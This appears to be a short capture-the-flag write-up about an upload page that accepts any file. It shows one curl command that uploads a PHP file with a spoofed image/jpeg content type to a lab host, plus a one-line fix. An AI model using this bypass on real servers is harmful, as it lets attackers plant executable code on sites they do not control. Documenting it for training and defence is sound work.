On the upload page, you can upload a image file, but you can input any file and change the type of upload data.

I created a test.php file and used curl for the POST request.

curl -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" "http://172.20.10.12/index.php?page=upload" | grep 'flag'

To prevent this, check the file type and user permissions before uploading the file
